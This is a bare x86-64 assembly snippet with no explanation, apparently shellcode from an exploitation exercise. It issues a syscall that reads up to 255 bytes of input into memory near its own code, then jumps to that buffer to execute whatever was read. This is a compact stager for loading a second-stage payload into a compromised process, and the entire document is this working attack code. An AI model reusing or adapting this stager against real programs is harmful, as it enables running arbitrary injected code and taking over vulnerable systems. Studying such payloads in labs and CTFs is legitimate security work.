[SECTION .text]
global _start
_start:
	mov dl, 0xff
	lea rsi, [rel $ +0xffffffffffffffff ] 
	add rsi, 0x43
	syscall
	jmp rsi

